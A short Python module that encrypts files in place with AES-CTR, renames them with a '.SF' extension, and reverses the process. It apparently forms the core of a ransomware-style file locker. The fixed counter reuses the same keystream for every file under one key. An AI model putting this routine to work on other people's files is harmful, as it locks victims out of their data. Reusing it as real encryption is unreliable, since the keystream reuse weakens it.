from Cryptodome.Cipher import AES
from Cryptodome.Util import Counter
import os
def encryption(key,_file):
    counter = Counter.new(128)
    c = AES.new(key, AES.MODE_CTR, counter=counter)
    with open(_file, 'r+b') as f:
         block_size = AES.block_size
         plaintext = f.read(block_size)
         while plaintext:
             f.seek(-len(plaintext), 1)
             f.write(c.encrypt(plaintext))
             plaintext = f.read(block_size)
    os.rename(_file, _file + ".SF")
    return[key]
def decryption(key, file):
    counter = Counter.new(128)
    _c = AES.new(key, AES.MODE_CTR, counter=counter)
    with open(file, 'r+b') as f:
         block_size = AES.block_size
         plaintext = f.read(block_size)
         while plaintext:
             f.seek(-len(plaintext), 1)
             f.write(_c.decrypt(plaintext))
             plaintext = f.read(block_size)
    os.rename(file, file[:-3])

         